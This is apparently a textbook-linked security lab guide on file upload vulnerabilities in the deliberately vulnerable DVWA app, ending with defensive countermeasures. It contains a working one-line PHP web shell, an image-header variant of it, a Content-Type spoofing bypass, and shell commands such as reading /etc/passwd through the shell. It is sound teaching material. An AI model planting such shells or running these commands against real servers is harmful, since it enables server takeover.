# Chapter 4.12: File Upload Vulnerabilities -- Hands-On Practice

**Book Reference:** Chapter 4.12 of *Safe Web Application Development* by Tokumaru Hiroshi

---

## Prerequisites

- Docker running with DVWA container up (`docker compose up -d`)
- DVWA logged in (admin / password) at `http://localhost:8080`
- OWASP ZAP running and intercepting traffic
- FoxyProxy configured to route through ZAP

---

## What You'll Learn

- Uploading malicious files to a web server
- Achieving server-side script execution through uploaded files
- Bypassing file type checks (Content-Type header manipulation)
- Bypassing extension-based validation
- Understanding proper upload validation (defense in depth)

---

## DVWA Module: File Upload

Navigate to: **DVWA > File Upload**

---

## Exercise Steps

### Low Security Level

1. Go to **DVWA > File Upload**.
2. First, upload a normal image file (any `.jpg` or `.png` from your machine) to see the basic upload functionality work. Note the success message and the upload path shown.
3. Now create a malicious PHP file. A file called `shell.php` is provided in this folder with the following content:
   ```php
   <?php echo system($_GET['cmd']); ?>
   ```
4. Upload `shell.php` through the DVWA upload form. It succeeds with absolutely no validation!
5. Note the upload path shown in the response (e.g., `../../hackable/uploads/shell.php`).
6. Visit the uploaded shell in your browser:
   ```
   http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
   ```
7. You now have **command execution on the server**. The server runs your PHP code and returns the output.
8. Try additional commands to explore the impact:
   ```
   ?cmd=cat /etc/passwd
   ?cmd=ls -la
   ?cmd=uname -a
   ?cmd=id
   ```
9. This demonstrates why file upload without validation has the same impact as OS Command Injection. An attacker gains full control of the server.

---

### Medium Security Level

Set DVWA Security to **Medium** (DVWA Security > Medium > Submit).

1. The application now checks the **Content-Type** header. It only accepts `image/jpeg` or `image/png`.
2. Try uploading `shell.php` directly. It gets rejected because the browser sends `Content-Type: application/x-php`.
3. Use **ZAP** to intercept the upload request:
   - Enable request interception in ZAP (break on requests).
   - Upload `shell.php` through the DVWA form.
   - ZAP catches the request before it reaches the server.
4. In the intercepted request, find the `Content-Type` line inside the multipart form data for the file. Change it:
   ```
   Content-Type: application/x-php  -->  Content-Type: image/jpeg
   ```
5. Forward the modified request. The upload succeeds!
6. Access the shell the same way as before:
   ```
   http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
   ```
7. **Lesson:** Content-Type checking alone is NOT sufficient. The Content-Type header is entirely client-controlled and trivially spoofed.

---

### High Security Level

Set DVWA Security to **High**.

1. The application now checks the **file extension**. It must end in `.jpg`, `.jpeg`, or `.png`.
2. Try uploading `shell.php` directly. Rejected.
3. Try renaming the file to `shell.php.jpg` and uploading it. The upload succeeds, but if you visit the URL, the server treats it as a JPEG, not PHP. It will not execute.
4. Try another approach: add a fake image header to the PHP file. Create a file with `GIF89a` at the very beginning followed by the PHP code:
   ```
   GIF89a
   <?php echo system($_GET['cmd']); ?>
   ```
   Save this as `shell.jpg`. The upload succeeds because the extension passes the check and the first bytes look like an image.
5. However, direct access to `shell.jpg` will not execute PHP code because Apache serves it based on the `.jpg` extension.
6. **Lesson:** Extension checking is stricter than Content-Type checking, but there are still potential bypass scenarios depending on server configuration (e.g., `.htaccess` overrides, double extensions in misconfigured servers, or combining with a Local File Include vulnerability).

---

### Impossible Security Level

Set DVWA Security to **Impossible**.

1. Try any bypass technique you know. Nothing works.
2. Click **View Source** to see the code. It implements multiple layers of defense:
   - Checks file extension (must be `.jpg`, `.jpeg`, or `.png`)
   - Renames the file to a random name (prevents predictable paths)
   - Validates image dimensions using `getimagesize()` (ensures it is a real image)
   - Re-creates the image using `imagecreatefromjpeg()` / `imagecreatefrompng()` (strips all metadata and embedded code)
   - Uses an anti-CSRF token
3. This is comprehensive validation that follows the book's recommendations. Even if PHP code is embedded inside image metadata, the re-creation step destroys it.

---

## What to Observe in ZAP

- **Request body:** See the `multipart/form-data` POST request containing the file content. Notice how the file bytes are transmitted in the request body.
- **Content-Type header:** At Medium level, observe the Content-Type value inside the multipart boundary that you need to modify.
- **Response body:** See the server response showing the upload path (or the rejection message).
- **History tab:** Compare successful vs. failed upload attempts to understand what changed.

---

## Book Connection

| Topic | Book Section |
|---|---|
| File upload vulnerability overview | Section 4.12.1 |
| Script execution via uploaded files | Section 4.12.2 |
| Content-Type bypass | Book's warning about trusting client-supplied headers |
| Defense strategy | Book's countermeasures section |

**Book's recommended countermeasures:**
- Validate file extension on the server side (allowlist, not denylist)
- Check actual file content (not just headers)
- Store uploaded files **outside the web document root**
- Rename files to random names upon upload
- Re-process images to strip embedded code

---

## Key Takeaways

1. **No validation = full server compromise.** Uploading a PHP shell gives the attacker OS-level command execution.
2. **Content-Type is useless as a sole check.** It is a client-supplied header and trivially modified with any proxy tool.
3. **Extension checks are better but not bulletproof.** Server misconfigurations or combined attacks (LFI + upload) can still lead to execution.
4. **Defense in depth is required.** The Impossible level shows the correct approach: extension check + content validation + file renaming + image re-creation.
5. **Store uploads outside the webroot.** If the uploaded file cannot be accessed via a URL, script execution is impossible regardless of file content.
